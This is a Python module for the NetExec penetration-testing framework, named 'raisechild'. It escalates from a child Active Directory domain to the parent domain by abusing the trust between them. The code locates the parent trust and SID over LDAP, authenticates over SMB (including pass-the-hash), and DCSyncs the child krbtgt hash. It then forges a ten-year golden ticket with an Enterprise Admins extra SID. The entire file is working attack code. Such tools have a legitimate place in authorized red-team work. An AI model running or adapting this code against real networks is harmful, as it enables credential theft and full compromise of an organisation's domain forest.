import re
from argparse import Namespace
from contextlib import suppress
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.dcerpc.v5.drsuapi import DCERPCSessionError
from ticketer import TICKETER
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """Module made by @azoxlpf"""
    name = "raisechild"
    description = "Compromise parent domain from child domain via trust abuse"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.parent_domain = None
        self.parent_sid = None
        self.child_sid = None
        self.child_domain = None
        self.target_dc = None
        self.valid_tgt = None
        self.new_ticket = None
        self.krbtgt_hash = ""

    def options(self, context, module_options):
        """
        Forge a Kerberos TGT using the child domain's krbtgt hash,
        with an extra SID targeting privileged groups in the parent domain.
        Requires an existing trust with the parent.

        USER        Target username to forge the ticket for (default: Administrator)
        USER_ID     RID used as the user ID in the PAC (default: 500)
        RID         RID used for the extra SID (default: 519 = Enterprise Admins)

        Examples:
            -o USER=DC01$
            -o USER_ID=1001
            -o RID=512
        """
        self.context = context
        self.module_options = module_options

    def on_admin_login(self, context, connection):
        self.context = context
        context.log.display("Running raisechild module...")
        self.get_domain_sid(connection)
        self.get_parent_info(connection)
        if not self.parent_domain or not self.parent_sid:
            context.log.fail("No parent trust (AD + inbound) found.")
            return
        self.get_krbtgt_hash(connection)

    def get_parent_info(self, connection):
        base_dn = f"CN=System,{connection.baseDN}"
        attributes = ["name", "trustPartner", "securityIdentifier", "trustDirection", "trustType"]

        try:
            response = connection.search(
                searchFilter="(objectClass=trustedDomain)",
                attributes=attributes,
                baseDN=base_dn,
            )
            trusts = parse_result_attributes(response)
            self.context.log.debug(f"TrustedDomain objects: {trusts}")

            for trust in trusts:
                trust_name = trust.get("name")
                trust_partner = trust.get("trustPartner")
                trust_sid = trust.get("securityIdentifier")
                trust_direction = int(trust.get("trustDirection", 0))
                trust_type = int(trust.get("trustType", 0))

                # 2 = TRUST_TYPE_UPLEVEL; direction 1 (inbound) or 3 (bi-directional)
                if trust_type == 2 and trust_direction in (1, 3):
                    self.parent_domain = trust_partner or trust_name

                    try:
                        revision = trust_sid[0]
                        count = trust_sid[1]
                        id_auth = int.from_bytes(trust_sid[2:8], byteorder="big")
                        sub_auths = [
                            str(int.from_bytes(trust_sid[8 + i * 4 : 12 + i * 4], byteorder="little"))
                            for i in range(count)
                        ]
                        trust_sid = f"S-{revision}-{id_auth}-" + "-".join(sub_auths)
                    except Exception as e:
                        self.context.log.fail(f"Failed to convert parent SID to string: {e}")
                        trust_sid = None

                    self.parent_sid = trust_sid
                    self.context.log.highlight(f"Parent domain name: {self.parent_domain}")
                    self.context.log.highlight(f"Parent domain SID:  {self.parent_sid}")
                    return

        except Exception as e:
            self.context.log.fail(f"Failed to query trustedDomain entries: {e}")

    def get_domain_sid(self, connection):
        if connection.sid_domain:
            self.child_sid = connection.sid_domain
            self.context.log.highlight(f"Child Domain SID: {self.child_sid}")
        else:
            self.context.log.fail("Could not retrieve child domain SID from connection.")

    def _get_smb_session(self, ldap_conn):
        smb = SMBConnection(
            remoteName=ldap_conn.hostname,
            remoteHost=ldap_conn.host,
            sess_port=445,
        )

        if ldap_conn.kerberos:
            smb.kerberosLogin(
                user=ldap_conn.username,
                password=ldap_conn.password,
                domain=ldap_conn.domain,
                lmhash=ldap_conn.lmhash,
                nthash=ldap_conn.nthash,
                aesKey=ldap_conn.aesKey,
                kdcHost=ldap_conn.kdcHost,
                useCache=ldap_conn.use_kcache,
            )
        elif ldap_conn.nthash or ldap_conn.lmhash:
            # NTLM pass-the-hash
            smb.login(ldap_conn.username, "", ldap_conn.domain, lmhash=ldap_conn.lmhash, nthash=ldap_conn.nthash)
        else:
            # NTLM with cleartext password
            smb.login(ldap_conn.username, ldap_conn.password, ldap_conn.domain)
        return smb

    def _dcsync_krbtgt(self, smb_conn, ldap_conn):
        try:
            rop = RemoteOperations(
                smb_conn,
                doKerberos=ldap_conn.kerberos,
                kdcHost=ldap_conn.kdcHost,
            )
            rop.enableRegistry()
            rop.getDrsr()
            boot_key = rop.getBootKey()

            domain_netbios = ldap_conn.domain.split(".")[0]
            target_user = f"{domain_netbios}/krbtgt"

            def grab_hash(secret_type, secret):
                if secret.lower().startswith("krbtgt:"):
                    self.krbtgt_hash = secret

            ntds = NTDSHashes(
                None,
                boot_key,
                isRemote=True,
                noLMHash=True,
                remoteOps=rop,
                justNTLM=True,
                justUser=target_user,
                printUserStatus=False,
                perSecretCallback=grab_hash,
            )
            ntds.dump()

            if self.krbtgt_hash:
                self.context.log.highlight(f"krbtgt hash from {ldap_conn.domain}: {self.krbtgt_hash}")
            else:
                self.context.log.fail("DCSync completed - krbtgt hash not found!")
        except DCERPCSessionError as e:
            self.context.log.fail(f"RPC DRSUAPI error: {e}")
        except Exception as e:
            self.context.log.fail(f"DCSync error: {e}")
        finally:
            with suppress(Exception):
                if ntds:
                    ntds.finish()
            with suppress(Exception):
                if rop:
                    rop.finish()
            with suppress(Exception):
                smb_conn.logoff()

    def get_krbtgt_hash(self, connection):
        try:
            smb_conn = self._get_smb_session(connection)
            self._dcsync_krbtgt(smb_conn, connection)
        except Exception as e:
            self.context.log.fail(f"Error during DCSync : {e}")
            return

        if hasattr(self, "krbtgt_hash") and self.krbtgt_hash:
            try:
                tgt = self.forge_golden_ticket(connection)
                self.context.log.success(f"Golden ticket forged successfully. Saved to: {tgt}")
                self.context.log.success(f"Run the following command to use the TGT: export KRB5CCNAME={tgt}")
                self.forged_tgt = tgt
            except Exception as e:
                self.context.log.fail(f"Error while generating golden ticket : {e}")
        else:
            self.context.log.fail("Cannot forge ticket: krbtgt hash missing.")

    def _clean_nthash(self, raw):
        if ":" in raw:
            parts = raw.split(":")
            if len(parts) >= 4:
                raw = parts[3]
        raw = raw.strip()
        if not re.fullmatch(r"[0-9a-fA-F]{32}", raw):
            raise ValueError(f"Invalid NT-hash format : {raw}")
        return raw.lower()

    def forge_golden_ticket(self, connection):
        """
        Forge a golden ticket for the child domain using the krbtgt NT-hash.
        Supports optional USER, RID and USER_ID module options.
        """
        # Normalize module_options to a plain dict
        opts = {}
        if self.module_options:
            opts = (
                vars(self.module_options)
                if not isinstance(self.module_options, dict)
                else self.module_options.copy()
            )

        default_admin = "Administrator"
        admin_name = opts.get("USER", default_admin) or default_admin

        nthash = self._clean_nthash(self.krbtgt_hash)

        default_extra = "519"
        extra_rid = str(opts.get("RID", default_extra)) or default_extra
        extra_sid = f"{self.parent_sid}-{extra_rid}"

        default_user = "500"
        user_rid = str(opts.get("USER_ID", default_user)) or default_user

        tick_opts = Namespace(
            request=False,  # offline mode
            nthash=nthash,  # krbtgt NT-hash
            aesKey=None,  # use RC4_HMAC
            domain=connection.domain,
            domain_sid=self.child_sid,
            extra_sid=extra_sid,
            groups="513,512,520,518,519",
            user=admin_name,
            user_id=user_rid,
            duration="87600",  # hours (10 years)
            spn=None,
            dc_ip=None,
            old_pac=False,
            extra_pac=False,
            impersonate=None,
        )

        t = TICKETER(
            admin_name,
            None,
            connection.domain,
            tick_opts,
        )
        t.run()

        return f"{admin_name}.ccache"
